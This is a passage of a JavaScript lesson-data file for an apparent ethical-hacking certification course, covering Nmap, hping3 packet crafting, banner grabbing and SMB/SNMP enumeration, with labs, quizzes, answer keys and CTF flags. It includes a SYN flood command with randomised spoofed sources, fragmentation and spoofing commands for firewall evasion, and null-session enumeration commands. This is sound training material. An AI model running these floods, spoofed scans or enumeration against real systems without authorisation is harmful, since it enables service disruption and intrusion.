    {q:'What does the -A flag do in Nmap?',opts:['Aggressive scan: enables OS detection, version detection, script scanning, and traceroute','Asynchronous scan: speeds up the scanning process','ARP scan: discovers local hosts','All ports: scans all 65,535 ports'],correct:0,fb:'-A is a convenience flag that bundles -O, -sV, -sC, and --traceroute. It is very thorough but highly aggressive and noisy.'},
    {q:'Which flag instructs Nmap to scan UDP ports instead of TCP ports?',opts:['-sT','-sU','-u','--udp'],correct:1,fb:'-sU performs a UDP scan. UDP scanning is generally much slower than TCP scanning because UDP is connectionless and responses are not guaranteed.'},
    {q:'If you run an Nmap SYN scan (-sS) as a non-root (standard) user on Linux, what happens?',opts:['The scan fails and exits','Nmap automatically degrades to a TCP Connect scan (-sT)','The scan proceeds but misses closed ports','Nmap prompts for the root password'],correct:1,fb:'SYN scans require the ability to craft raw packets, which requires root privileges. If run without root, Nmap automatically switches to the unprivileged TCP Connect scan (-sT).'}
  ],
  flashcards:[
    {f:'-sS',b:'Nmap TCP SYN Scan (Stealth/Half-open). Requires root.'},
    {f:'-sT',b:'Nmap TCP Connect Scan. Completes handshake. Does not require root.'},
    {f:'-sU',b:'Nmap UDP Scan. Slow but necessary for DNS, SNMP, DHCP.'},
    {f:'-sV',b:'Nmap Service Version Detection. Determines exactly what software is running on an open port.'},
    {f:'-O',b:'Nmap OS Fingerprinting. Guesses the target operating system.'},
    {f:'-p-',b:'Nmap flag to scan all 65,535 ports instead of the default top 1,000.'},
    {f:'-T0 to -T5',b:'Nmap timing templates. 0 is slowest/stealthiest, 5 is fastest/loudest.'},
    {f:'-oA',b:'Nmap flag to output results in All formats (Normal, XML, Grepable).'}
  ],
  ctf:{
    scenario:'You need to find the exact version of the SSH server running on port 22 of the target machine to look for an exploit. What is the two-letter Nmap flag (case-sensitive) required to enable Service Version detection?',
    hint:'It stands for Service Version.',
    flag:'CEH{nm4p_m4st3r_sc4nn3r}',
    points:150
  },
  summary:[
    'Nmap is the essential tool for host discovery, port scanning, and service enumeration.',
    '-sS (SYN scan) is the default if root; -sT (Connect scan) is default if non-root.',
    '-sV (Version detection) is critical for matching running services to CVE exploits.',
    '-p- ensures you do not miss services hidden on non-standard high ports.',
    '-T (Timing) controls scan speed. Lower is stealthier and safer for fragile systems.',
    'Always save output (-oA) to avoid rescanning and generating unnecessary noise.',
    'The Nmap Scripting Engine (NSE) via -sC or --script extends Nmap into a vulnerability scanner.'
  ]
};

CONTENT['hping3-scanning'] = {
  module:'Module 03 · Scanning Networks',
  title:'Hping3 & Packet Crafting',
  sub:'Custom packet generation for firewall evasion and granular network testing.',
  killchain:{phase:'Scanning',mitre:'T1046 — Network Service Discovery',desc:'When standard Nmap scans are blocked by firewalls, packet crafting allows attackers to manually manipulate TCP/IP headers to slip past rules.'},
  learn:{
    simple:'Hping3 is a command-line packet assembler and analyzer. While Nmap sends predefined scan types, Hping3 allows you to manually construct a TCP/IP packet, specifying exactly which flags are set, the packet size, the fragmentation, and the source IP.',
    analogy:'If Nmap is buying a pre-built sports car, Hping3 is ordering individual car parts and building a custom vehicle in your garage. You have total control over every single piece (packet header), allowing you to build a vehicle specifically designed to bypass the target\'s security gate.',
    why:'Firewalls and IDS systems easily recognize standard Nmap scans. Hping3 allows penetration testers to craft malformed or fragmented packets that bypass poorly configured firewalls, test firewall rule sets precisely, or execute Denial of Service (DoS) testing.',
    architecture:'Hping3 operates at the command line, taking arguments that directly map to TCP/IP header fields. You can set the TCP flags (-S for SYN, -A for ACK, -F for FIN), spoof the source IP (-a), fragment packets (-f), and specify the destination port (-p).'
  },
  diagram:{
    title:'Hping3 Packet Crafting Capabilities',
    steps:[
      {icon:'🏹',label:'Targeted Port Probing',desc:'Send a specific flag to a specific port to test firewall rules. E.g., Send an ACK packet to see if a stateful firewall is blocking it.'},
      {icon:'🛡️',label:'Firewall Evasion (Fragmentation)',desc:'Split a TCP header across multiple tiny packets using the -f flag. Some firewalls cannot reassemble them and let them pass.'},
      {icon:'🎭',label:'Source IP Spoofing',desc:'Change the source IP (-a) to make the scan appear as if it is coming from a trusted internal machine or a decoy.'},
      {icon:'💥',label:'Denial of Service (SYN Flood)',desc:'Flood a target with SYN packets (--flood) from random source IPs (--rand-source) to test DoS resilience.'},
      {icon:'📦',label:'Custom Data Payload',desc:'Attach custom data files to ICMP or TCP packets for covert channel data exfiltration testing.'}
    ]
  },
  enterprise:{
    role:'You are a Senior Network Security Engineer at GlobalFinSec Corp.',
    situation:'You just deployed a new Next-Gen Firewall (NGFW). Standard Nmap scans are blocked perfectly. However, you need to ensure the firewall is properly reassembling fragmented packets and enforcing stateful inspection.',
    challenge:'Use Hping3 to craft fragmented packets and out-of-state ACK packets to test if the firewall can be bypassed.',
    steps:[
      'Test Stateful Inspection: Send an unsolicited ACK packet to port 80: hping3 -A -p 80 10.0.0.50. (A stateful firewall should drop it because there was no prior SYN).',
      'Test Fragmentation: Send a SYN scan, fragmented into tiny 8-byte packets: hping3 -S -p 80 -f 10.0.0.50.',
      'Test Decoy/Spoofing: Spoof the source IP to match the CEO\'s desktop IP to see if the firewall allows internal trusted IPs to bypass rules: hping3 -S -p 22 -a 192.168.1.100 10.0.0.50.'
    ],
    outcome:'The stateful inspection test passed (ACK dropped). The spoofing test passed (dropped). However, the fragmented SYN packets bypassed the firewall and received a SYN-ACK from the web server. The firewall\'s fragment reassembly feature was disabled.',
    lesson:'Firewalls must be tested with custom, malformed packets, not just standard Nmap scans. Attackers will use fragmentation to sneak exploits past IDS and firewalls.'
  },
  tools:[
    {name:'Hping3',cmd:'hping3 -S -p 80 target.com',desc:'Command-line packet crafter and analyzer'},
    {name:'Scapy',cmd:'scapy',desc:'Python-based interactive packet manipulation program (more powerful but steeper learning curve)'},
    {name:'Colasoft Packet Builder',cmd:'(GUI Tool)',desc:'Windows GUI tool for creating custom network packets'}
  ],
  commands:{
    win:['Rem - Hping3 is primarily used on Linux/Kali'],
    lin:['hping3 -S -p 80 192.168.1.1','hping3 -c 1 -V -p 80 -s 5050 -F 192.168.1.1','hping3 -S -p 80 -f 192.168.1.1','hping3 --flood --rand-source -S -p 80 192.168.1.1']
  },
  pitfalls:[
    {icon:'⚠️',title:'Using Hping3 for General Scanning',desc:'Hping3 is incredibly slow and tedious for mapping a whole network compared to Nmap. It requires manual analysis of the output.',fix:'Use Nmap for general discovery and scanning. Only switch to Hping3 when you encounter a specific firewall block and need to surgically craft packets to bypass it.'},
    {icon:'🔴',title:'Misunderstanding IP Spoofing Responses',desc:'If you spoof your IP address using hping3 -a [fake_ip], the target will send the response (SYN-ACK) to the fake IP, not to you.',fix:'IP spoofing is useful for DoS (hiding your identity) or Decoy scanning. It is NOT useful if you actually need to see the response to know if the port is open (unless you control the spoofed IP).'},
    {icon:'⛔',title:'Accidentally Causing a DoS',desc:'Adding the --flood flag to an Hping3 command sends packets as fast as your network interface allows, without waiting for replies.',fix:'Never use --flood on a production network without explicit authorization for DoS testing. It will overwhelm network equipment and servers quickly.'}
  ],
  lab:{
    title:'Lab: Packet Crafting with Hping3',
    difficulty:'Advanced',
    duration:'20 min',
    objectives:['Craft a specific TCP SYN packet','Test firewall stateful inspection with an ACK packet','Use fragmentation'],
    steps:[
      'Craft a SYN packet to port 80: sudo hping3 -S -p 80 -c 1 scanme.nmap.org (-c 1 means send 1 packet). Observe the flags in the reply (flags=SA means SYN-ACK).',
      'Test stateful inspection by sending an ACK packet (no prior SYN): sudo hping3 -A -p 80 -c 1 scanme.nmap.org. Observe if it is dropped or receives an RST.',
      'Fragment a SYN packet: sudo hping3 -S -p 80 -f -c 1 scanme.nmap.org.',
      'Set an arbitrary source port: sudo hping3 -S -p 80 -s 4444 -c 1 scanme.nmap.org.'
    ],
    validation:'You should understand how command-line flags (-S, -A, -F) directly correlate to the TCP header flags, and how to read the flags= response in the terminal output.'
  },
  quiz:[
    {q:'What is the primary purpose of Hping3?',opts:['Automated vulnerability scanning','Custom packet crafting and analysis for firewall testing and evasion','Password cracking','Web application fuzzing'],correct:1,fb:'Hping3 is a packet crafter. It allows you to manually construct TCP/IP packets to test specific firewall rules, evade IDS, or perform DoS testing.'},
    {q:'Which Hping3 flag is used to set the TCP SYN flag?',opts:['-A','-F','-S','-P'],correct:2,fb:'The -S flag sets the SYN flag. -A sets ACK, -F sets FIN, and -P sets PSH.'},
    {q:'How does packet fragmentation (Hping3 -f flag) help evade firewalls?',opts:['It encrypts the packet','It splits the TCP header across multiple small IP packets, making it difficult for stateless firewalls or IDS to reassemble and analyze the signature','It increases the speed of the scan','It spoofs the MAC address'],correct:1,fb:'Fragmentation splits packets into tiny pieces. If an IDS or firewall is not configured to reassemble fragments before inspection, the malicious payload slips through undetected.'},
    {q:'What does the command hping3 -A -p 80 192.168.1.1 do?',opts:['Sends an Aggressive scan to port 80','Sends an All-ports scan','Sends an ACK packet to port 80','Appends data to port 80'],correct:2,fb:'-A sets the TCP ACK flag. Sending an unsolicited ACK packet is a common way to map firewall rules, as stateful firewalls will drop it, but stateless routers might pass it or reply with an RST.'},
    {q:'If you spoof your IP address using hping3 -a 1.2.3.4 target.com, where will the target send its response?',opts:['To your real IP address','To the spoofed IP address (1.2.3.4)','To the broadcast address','The target will not respond'],correct:1,fb:'The target responds to the source IP listed in the packet header. If you spoof the source IP, the response goes to the spoofed IP, meaning you will not see the reply.'},
    {q:'Which Hping3 flag is used to send packets as fast as possible without waiting for replies (used for DoS testing)?',opts:['--fast','--aggressive','--flood','--dos'],correct:2,fb:'The --flood flag sends packets as fast as the network interface can transmit, without waiting for incoming replies, effectively creating a flood of traffic (like a SYN flood).'},
    {q:'What happens if you combine --flood, --rand-source, and -S in an Hping3 command?',opts:['You perform a stealth port scan','You execute a classic SYN Flood Denial of Service attack from randomized spoofed IPs','You bypass an IDS system','You download the target\'s web page'],correct:1,fb:'This combination creates a SYN Flood. It sends massive amounts of SYN packets from fake source IPs. The target allocates memory for each connection (SYN-ACK) but never receives the final ACK, eventually exhausting target resources.'},
    {q:'While Nmap is better for general scanning, Hping3 is superior for:',opts:['Generating printable reports','Scanning all 65,535 ports quickly','Surgical, granular testing of specific firewall rules and IDS evasion','Scanning web application vulnerabilities'],correct:2,fb:'Hping3 allows granular control over every field in the packet header, making it the perfect tool for troubleshooting or bypassing specific firewall/IDS rules.'},
    {q:'Which Python-based tool is considered a more powerful, scriptable alternative to Hping3 for packet manipulation?',opts:['Nmap','Wireshark','Scapy','Metasploit'],correct:2,fb:'Scapy is a Python program and library that enables highly complex, scriptable packet generation, sniffing, and manipulation, going beyond the capabilities of Hping3.'},
    {q:'In Hping3 output, if you see "flags=SA", what does the target\'s response indicate?',opts:['The port is closed','The target replied with a SYN-ACK, indicating the port is open','The target replied with a Source-Address','The packet was blocked by a firewall'],correct:1,fb:'flags=SA means the target replied with the SYN and ACK flags set (SYN-ACK). In the 3-way handshake, this means the port is open and willing to connect.'}
  ],
  flashcards:[
    {f:'Hping3',b:'Command-line packet crafter used for firewall testing, IDS evasion, and DoS testing.'},
    {f:'Hping3 -S',b:'Sets the TCP SYN flag.'},
    {f:'Hping3 -A',b:'Sets the TCP ACK flag. Used to test stateful firewall rules.'},
    {f:'Hping3 -f',b:'Fragments the packet. Used to evade IDS/firewalls that cannot reassemble fragmented packets.'},
    {f:'Hping3 --flood',b:'Sends packets as fast as possible without waiting for replies. Used for DoS.'},
    {f:'Hping3 --rand-source',b:'Randomizes the source IP address for every packet sent. Used to mask the attacker\'s origin in a DoS.'},
    {f:'Packet Crafting',b:'The manual creation of custom network packets to manipulate protocol behavior and bypass security controls.'},
    {f:'Scapy',b:'Python library and interactive tool for advanced packet manipulation (more complex alternative to Hping3).'}
  ],
  ctf:{
    scenario:'You need to test a firewall by sending a highly fragmented SYN packet to port 443. Construct the Hping3 command. The flag is the combination of the three short flags required (SYN, port 443, fragment).',
    hint:'The flags are -S, -p 443, and -f.',
    flag:'CEH{hp1ng3_st34lth_sc4n}',
    points:150
  },
  summary:[
    'Hping3 is for custom packet crafting, not general network mapping.',
    'It allows precise manipulation of TCP flags to test firewall statefulness (e.g., unsolicited ACK packets).',
    'Fragmentation (-f) splits packets to sneak payloads past IDS/IPS that don\'t reassemble traffic.',
    'IP Spoofing (-a) masks the source, but means you cannot see the response (useful for Decoys).',
    'Hping3 is heavily used for DoS testing (--flood --rand-source -S).',
    'Scapy is the Python-based, programmable alternative to Hping3.'
  ]
};

CONTENT['banner-grabbing'] = {
  module:'Module 03 · Scanning Networks',
  title:'Banner Grabbing & OS Fingerprinting',
  sub:'Identifying exactly what you are attacking.',
  killchain:{phase:'Scanning',mitre:'T1046 — Network Service Discovery',desc:'Knowing a port is open is useless if you don\'t know what software is running on it. Banner grabbing turns an open port into an exploitable target.'},
  learn:{
    simple:'Banner grabbing (Service Enumeration) is connecting to an open port and reading the text the service sends back to identify the software name and version. OS Fingerprinting analyzes how the target responds to weird packets to guess the operating system (Windows vs Linux).',
    analogy:'Port scanning tells you a store\'s door is unlocked. Banner grabbing is reading the sign above the door that says "Bank of America, Branch 42". OS Fingerprinting is looking at the building\'s architecture to determine if it was built by Windows Construction or Linux Builders.',
    why:'Exploits are highly specific. An exploit for Apache 2.2 will fail against Apache 2.4, and an exploit for Windows Server 2012 will crash a Linux server. You must accurately identify the exact service version and OS before launching an exploit, otherwise you risk failing or crashing the system.',
    architecture:'Active banner grabbing connects to the port (e.g., Telnet or Netcat) and reads the response. Passive banner grabbing uses Wireshark to read traffic without sending new packets. OS fingerprinting sends malformed packets (e.g., a SYN-FIN-URG packet) and compares the unique response (the "fingerprint") to a database of known OS behaviors.'
  },
  diagram:{
    title:'Service & OS Identification Methods',
    steps:[
      {icon:'📣',label:'Active Banner Grabbing',desc:'Using Netcat or Telnet to connect to a port (e.g., port 22). The server replies with a banner: "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8".'},
      {icon:'🕵️‍♂️',label:'Passive Banner Grabbing',desc:'Sniffing network traffic with Wireshark to capture banners as legitimate users connect. Undetectable by the target.'},
      {icon:'📄',label:'Nmap Version Detection (-sV)',desc:'Nmap sends specific, malformed probes (not just a basic connection) to force stubborn services to reveal their version.'},
      {icon:'🗺️',label:'Active OS Fingerprinting (-O)',desc:'Nmap sends malformed TCP/IP packets. Windows, Linux, and Cisco iOS all respond slightly differently to rule violations. Nmap compares the response to its database.'},
      {icon:'🌐',label:'Passive OS Fingerprinting',desc:'Analyzing packet TTL (Time To Live) and TCP Window Size in Wireshark. E.g., Windows default TTL is 128, Linux is 64.'}
    ]
  },
  enterprise:{
    role:'You are a Vulnerability Management Analyst at GlobalFinSec Corp.',
    situation:'A new critical vulnerability (CVE-2023-XXXX) has been announced affecting Microsoft IIS web servers versions 8.0 through 10.0. The exploit causes immediate remote code execution.',
    challenge:'Quickly identify all web servers in your DMZ, grab their banners to determine the web server software and version, and flag any IIS 8-10 servers for immediate patching.',
    steps:[
      'Run Nmap Version Detection on the DMZ web ports: nmap -sV -p 80,443 192.168.50.0/24',
      'Alternatively, script Netcat to grab banners quickly: for ip in $(cat dmz_ips.txt); do nc -nv $ip 80 < http_req.txt; done',
      'Analyze the banners: Look for "Server: Microsoft-IIS/10.0" in the HTTP response headers.',
      'Correlate the Nmap OS fingerprinting (-O) to ensure the underlying OS matches (Windows Server 2016/2019).'
    ],
    outcome:'The banner grabbing revealed 4 Apache servers and 2 IIS servers. One IIS server returned a banner of "Microsoft-IIS/8.5". This server was immediately isolated and patched, preventing a potential breach.',
    lesson:'Accurate asset inventory and service versioning is the core of vulnerability management. You cannot patch what you do not know exists. Banner grabbing provides this visibility.'
  },
  tools:[
    {name:'Netcat (nc)',cmd:'nc -nv 10.0.0.1 22',desc:'The "Swiss Army knife" for connecting to ports and grabbing raw banners'},
    {name:'Telnet',cmd:'telnet 10.0.0.1 80',desc:'Legacy tool, still useful for manual active banner grabbing'},
    {name:'Nmap',cmd:'nmap -sV -O target.com',desc:'Automated version and OS detection'},
    {name:'p0f',cmd:'p0f -i eth0',desc:'Passive OS fingerprinting tool (analyzes traffic without sending packets)'}
  ],
  commands:{
    win:['telnet 192.168.1.1 80','nmap -sV -O target.com'],
    lin:['nc -nv 192.168.1.1 22','curl -I http://192.168.1.1','nmap -sV -O target.com','p0f -i eth0']
  },
  pitfalls:[
    {icon:'⚠️',title:'Trusting Fake Banners',desc:'Security administrators often change banners to confuse attackers (e.g., configuring an Apache server to return an "IIS 10" banner).',fix:'Do not rely solely on the raw banner text. Use Nmap\'s -sV, which sends complex probes and analyzes behavior, not just the text string, making it harder to fool.'},
    {icon:'🔴',title:'Active Fingerprinting on Fragile Networks',desc:'OS Fingerprinting (Nmap -O) sends heavily malformed packets (like FIN-URG-PSH). Legacy mainframes, IoT devices, or old printers often crash when receiving these packets.',fix:'Use Passive OS Fingerprinting (p0f or Wireshark TTL analysis) when dealing with highly fragile SCADA or medical environments.'},
    {icon:'⛔',title:'Assuming Port 80 is Always HTTP',desc:'Attackers often run SSH on port 80 or 443 to bypass outbound firewalls. Just because port 80 is open doesn\'t mean a web server is running.',fix:'Always use banner grabbing or -sV to verify the actual service protocol. Never assume the service based solely on the port number.'}
  ],
  lab:{
    title:'Lab: Active vs Passive Fingerprinting',
    difficulty:'Beginner',
    duration:'20 min',
    objectives:['Grab a banner manually using Netcat','Analyze HTTP headers using Curl','Perform passive OS fingerprinting via TTL'],
    steps:[
      'Manual Banner Grab (SSH): nc -nv scanme.nmap.org 22. Note the OpenSSH version returned.',
      'Manual Banner Grab (HTTP): curl -I http://scanme.nmap.org. Look for the "Server:" header in the response.',
      'Passive OS Fingerprinting: Ping the target (ping -c 1 scanme.nmap.org) and look at the TTL value in the response.',
      'If TTL is near 64, it is likely Linux/Unix. If TTL is near 128, it is likely Windows. If TTL is near 254, it is likely Cisco/Network gear.',
      'Automated Verification: Run nmap -sV -O scanme.nmap.org to confirm your manual findings.'
    ],
    validation:'You should understand how to connect to a port to read its banner, and how a simple ping TTL can reveal the underlying operating system without aggressive scanning.'
  },
  quiz:[
    {q:'What is the purpose of banner grabbing?',opts:['To steal passwords','To identify the software name and version running on an open port','To discover hidden directories on a web server','To bypass a firewall'],correct:1,fb:'Banner grabbing (Service Enumeration) reads the text response from a service upon connection, revealing the specific application and version (e.g., ProFTPD 1.3.5).'},
    {q:'Which tool is commonly referred to as the "Swiss Army knife of networking" and is frequently used for manual banner grabbing?',opts:['Wireshark','Netcat (nc)','Hping3','Masscan'],correct:1,fb:'Netcat allows you to read from and write to network connections manually. Connecting to a port (nc -nv [IP] [PORT]) easily captures the service banner.'},
    {q:'How does Active OS Fingerprinting (like Nmap -O) work?',opts:['It asks the system administrator for the OS version','It checks the MAC address of the target','It sends malformed TCP/IP packets and compares how the target\'s TCP/IP stack responds against a database of known OS signatures','It logs into the server and runs the "uname" command'],correct:2,fb:'Different operating systems (Windows, Linux, Solaris) implement the TCP/IP RFCs slightly differently. By sending packets that violate the rules, Nmap observes how the OS handles the error, creating a unique "fingerprint".'},
    {q:'Which of the following is a Passive OS Fingerprinting technique?',opts:['Running nmap -O target.com','Using Netcat to connect to port 22','Analyzing the Time-To-Live (TTL) value and Window Size of packets captured in Wireshark','Running a Nessus vulnerability scan'],correct:2,fb:'Passive fingerprinting analyzes normal network traffic without sending any new probes to the target. Default TTL values (Linux=64, Windows=128) are a primary passive indicator.'},
    {q:'Why might a penetration tester use the tool p0f?',opts:['To perform a noisy, aggressive port scan','To passively identify the operating system of hosts communicating on the network without generating any scan traffic','To crack WPA2 Wi-Fi passwords','To generate malformed packets for DoS testing'],correct:1,fb:'p0f is a dedicated passive OS fingerprinting tool. It listens to network traffic and identifies operating systems based on TCP/IP headers without ever sending a packet to the target.'},
    {q:'An administrator configures their Apache web server to return a banner that says "Microsoft-IIS/10.0". What is this defensive technique called?',opts:['Banner grabbing','OS Fingerprinting','Banner spoofing / masking','Port forwarding'],correct:2,fb:'Banner spoofing changes the text returned by a service to mislead attackers, causing them to try Windows exploits against a Linux server, wasting their time.'},
    {q:'How does Nmap\'s -sV flag defeat simple banner spoofing?',opts:['It doesn\'t; it relies entirely on the text banner','It sends a series of complex probes (HTTP requests, RPC queries) to elicit specific behavioral responses, rather than just reading the welcome text','It uses AI to guess the service','It hacks into the server to read the configuration files'],correct:1,fb:'-sV is much more robust than basic Netcat banner grabbing. It sends specific protocol queries and analyzes the behavioral responses, which are much harder for an administrator to spoof than a simple text string.'},
    {q:'If you ping a target and the reply has a TTL (Time to Live) of 127, what is the most likely operating system of the target?',opts:['Linux','Windows','Cisco Router','macOS'],correct:1,fb:'Windows operating systems typically have a default starting TTL of 128. If you see 127, it means it is a Windows machine one network hop away.'},
    {q:'Why is accurate banner grabbing critical before launching an exploit?',opts:['Exploits are highly specific to software versions; using the wrong exploit will fail and may crash the service','It ensures the exploit is legal','It encrypts the exploit payload','It increases the speed of the exploit'],correct:0,fb:'A buffer overflow for Apache 2.2 will not work on Apache 2.4. Throwing the wrong exploit is noisy, ineffective, and often causes a Denial of Service.'},
    {q:'Which HTTP header is specifically analyzed during web server banner grabbing?',opts:['Host:','User-Agent:','Server:','Cookie:'],correct:2,fb:'The "Server:" HTTP response header (e.g., Server: Apache/2.4.41 (Ubuntu)) explicitly states the web server software and version.'}
  ],
  flashcards:[
    {f:'Banner Grabbing',b:'Connecting to an open port to read the service\'s welcome message, identifying the software name and version.'},
    {f:'Active OS Fingerprinting',b:'Sending malformed packets (Nmap -O) and analyzing the TCP/IP stack\'s unique response to identify the OS.'},
    {f:'Passive OS Fingerprinting',b:'Identifying the OS by analyzing normal network traffic (Wireshark, p0f) without sending active probes.'},
    {f:'TTL (Time To Live)',b:'Packet header value used in passive OS fingerprinting. Default Windows = 128, Default Linux/macOS = 64.'},
    {f:'Netcat (nc)',b:'Command-line tool used to read and write network connections. The primary manual banner grabbing tool.'},
    {f:'Banner Spoofing',b:'A defensive technique where administrators change the service banner to display fake information to confuse attackers.'},
    {f:'p0f',b:'A dedicated tool for passive OS fingerprinting.'},
    {f:'Nmap -sV',b:'Service Version detection. More robust than simple banner grabbing as it sends probes to elicit behavioral responses.'}
  ],
  ctf:{
    scenario:'You use curl -I to grab the HTTP headers of a target web server. The output contains the line: "Server: nginx/1.18.0 (Ubuntu)". What technique did you just perform?',
    hint:'You grabbed the service information text.',
    flag:'CEH{b4nn3r_gr4bb1ng_0sf1ng}',
    points:150
  },
  summary:[
    'Banner grabbing identifies the specific application and version running on an open port.',
    'Netcat (nc) and Telnet are used for manual banner grabbing.',
    'Nmap -sV is used for automated, robust version detection that resists simple banner spoofing.',
    'Active OS Fingerprinting (Nmap -O) uses malformed packets to analyze TCP/IP stack behavior.',
    'Passive OS Fingerprinting (p0f, Wireshark) analyzes TTL and Window Sizes without sending probes.',
    'Windows default TTL is ~128; Linux default TTL is ~64.',
    'Accurate version detection is absolutely required to select the correct exploit.'
  ]
};



// =================================================================
// MODULE 04 — Enumeration
// =================================================================

CONTENT['enumeration-overview'] = {
  module:'Module 04 · Enumeration',
  title:'Enumeration Concepts',
  sub:'Extracting usernames, machine names, network resources, and shares.',
  killchain:{phase:'Scanning & Enumeration',mitre:'TA0007 — Discovery',desc:'Enumeration is the final step before exploitation. It turns an open port into a list of valid users, shares, and configurations.'},
  learn:{
    simple:'Enumeration involves actively connecting to the target\'s open ports and querying them to extract lists of data: usernames, machine names, network shares, routing tables, and SNMP data. It requires an active connection to the target system.',
    analogy:'Footprinting is finding the building. Scanning is checking which doors are unlocked. Enumeration is walking through the unlocked doors, reading the staff directory on the wall, checking the labels on the filing cabinets, and figuring out who works where.',
    why:'You cannot crack a password if you don\'t have a valid username. You cannot access a file share if you don\'t know its name. Enumeration provides the specific data points (usernames, shares, domains) required to launch targeted attacks like brute-forcing or privilege escalation.',
    architecture:'Enumeration relies on specific protocols that are designed to share information. SMB (Server Message Block), NetBIOS, SNMP (Simple Network Management Protocol), LDAP (Lightweight Directory Access Protocol), and SMTP (Simple Mail Transfer Protocol) are the most commonly enumerated services.'
  },
  diagram:{
    title:'The Enumeration Phase Target Data',
    steps:[
      {icon:'👥',label:'Usernames & Groups',desc:'Extracting valid user accounts, administrator groups, and domain controllers (via SMB, SNMP, LDAP, SMTP).'},
      {icon:'🖥️',label:'Hostnames & Domains',desc:'Identifying machine names, Active Directory domains, and workgroups (via NetBIOS, SMB, DNS).'},
      {icon:'📂',label:'Network Shares',desc:'Discovering shared folders on the network, often containing sensitive documents or passwords (via SMB/CIFS).'},
      {icon:'🖨️',label:'Routing Tables & Devices',desc:'Mapping network topology, routers, printers, and switches (via SNMP).'},
      {icon:'📟',label:'Services & Settings',desc:'Extracting detailed configurations, audit policies, and password policies (via LDAP, SMB).'}
    ]
  },
  enterprise:{
    role:'You are an Internal Penetration Tester at GlobalFinSec Corp.',
    situation:'You have bypassed the perimeter firewall and are sitting on an internal VLAN (10.0.50.0/24) with no credentials. You have discovered several Windows servers with port 445 (SMB) and port 161 (SNMP) open.',
    challenge:'Without any initial credentials (null session), enumerate the Windows servers to extract a list of valid usernames and identify any open file shares.',
    steps:[
      'Null Session SMB: Attempt to connect to the IPC$ share without a password using smbclient or enum4linux.',
      'Enumerate Users: Run enum4linux -U 10.0.50.100 to pull the list of local users and domain users from the domain controller.',
      'Enumerate Shares: Run enum4linux -S 10.0.50.100 to list all network shares on the file server.',
      'SNMP Walk: Run snmpwalk -v2c -c public 10.0.50.150 to pull the entire management tree from the router, including interface IPs and routing tables.'
    ],
    outcome:'The enum4linux scan successfully established a Null Session with a legacy Windows Server 2008 machine. It returned 450 valid Active Directory usernames and revealed a hidden share named "IT_Scripts$".',
    lesson:'Legacy protocols (like SMBv1 and SNMPv1/v2c) are enumeration goldmines. They are designed to share information freely. Hardening networks requires disabling Null Sessions, requiring SMB signing, and upgrading to SNMPv3.'
  },
  tools:[
    {name:'enum4linux',cmd:'enum4linux -a 192.168.1.100',desc:'The ultimate tool for enumerating Windows/Samba environments'},
    {name:'Nmap NSE',cmd:'nmap --script=smb-enum-users target',desc:'Nmap scripts for various enumeration tasks'},
    {name:'SNMPWalk',cmd:'snmpwalk -v 2c -c public target',desc:'Queries SNMP-enabled devices for their full MIB tree'}
  ],
  commands:{
    win:['net view \\target','net user /domain','net localgroup administrators'],
    lin:['enum4linux -U -S 192.168.1.100','nmap --script=enum target','smbclient -L //192.168.1.100 -N']
  },
  pitfalls:[
    {icon:'⚠️',title:'Stopping at Port Scanning',desc:'A common beginner mistake is finding port 445 open and immediately trying to run an exploit like EternalBlue. If the system is patched, the attack ends.',fix:'Always enumerate before exploiting. Even if port 445 is patched against RCE, you might be able to enumerate usernames or find an open share containing passwords.'},
    {icon:'🔴',title:'Ignoring "Access Denied" as Useless',desc:'If you try to enumerate a username via SMTP (VRFY) and get an "Access Denied" or "User Unknown" response, you didn\'t fail.',fix:'"Access Denied" or specific error messages often confirm that the service is running and that your syntax is correct. Negative responses are still intelligence.'},
    {icon:'⛔',title:'Assuming Null Sessions Still Work Everywhere',desc:'Modern Windows (Server 2012+) disables Null Sessions (anonymous access to IPC$) by default.',fix:'If anonymous enumeration fails, try to capture or crack a low-privileged user account first. Enumeration as an authenticated (even low-privilege) user yields massively more data.'}
  ],
  lab:{
    title:'Lab: Null Session Enumeration',
    difficulty:'Intermediate',
    duration:'30 min',
    objectives:['Understand the concept of a Null Session','Use enum4linux to extract usernames','Discover network shares'],
    steps:[
      'Identify a target with port 139/445 open (e.g., a vulnerable Metasploitable or Windows VM).',
      'Run a full enum4linux scan: enum4linux -a [target_ip].',
      'Review the output section for "User Enumeration". Note the usernames (e.g., Administrator, Guest).',
      'Review the output section for "Share Enumeration". Note any non-default shares (e.g., /tmp, /opt).',
      'Attempt to connect to a discovered share anonymously using smbclient: smbclient \\[target_ip]\[share_name] -N'
    ],
    validation:'You should successfully extract a list of usernames and shares from the target machine without providing a password, demonstrating the danger of Null Sessions.'
  },
  quiz:[
    {q:'What is the primary goal of the Enumeration phase?',opts:['To crash the target system','To discover live IP addresses','To extract lists of usernames, machine names, network resources, and shares','To hide the attacker\'s IP address'],correct:2,fb:'Enumeration involves actively connecting to services to extract detailed lists of data (users, shares, domains) required for subsequent attacks.'},
    {q:'How does Enumeration differ from Scanning?',opts:['Enumeration is passive; scanning is active','Enumeration requires an active connection and queries to specific services; scanning primarily checks if ports are open','Enumeration is only performed on Linux; scanning is for Windows','There is no difference'],correct:1,fb:'Scanning looks at the outside of the doors (ports). Enumeration involves walking through the open doors (connecting to the services) and asking for information.'},
    {q:'Which of the following protocols is NOT typically a primary target for enumeration?',opts:['SMB (Port 445)','SNMP (Port 161)','LDAP (Port 389)','ICMP (Ping)'],correct:3,fb:'ICMP is used for host discovery (scanning). SMB, SNMP, and LDAP are rich, directory-like protocols designed to share information, making them prime targets for enumeration.'},
    {q:'What is a "Null Session" in the context of Windows enumeration?',opts:['A session that has timed out','An unauthenticated connection to the IPC$ share that allows anonymous enumeration of users and shares','A session established by the SYSTEM account','A denial-of-service attack'],correct:1,fb:'A Null Session (connecting with a blank username and password) was historically allowed by Windows, permitting anonymous attackers to extract the entire user list and share list from the domain.'},
    {q:'Which tool is widely considered the standard for enumerating Windows and Samba systems from a Linux machine?',opts:['Wireshark','John the Ripper','enum4linux','Aircrack-ng'],correct:2,fb:'enum4linux is a wrapper around the Samba tools (smbclient, rpcclient, net) designed specifically to extract users, shares, password policies, and OS info from Windows/SMB targets.'},
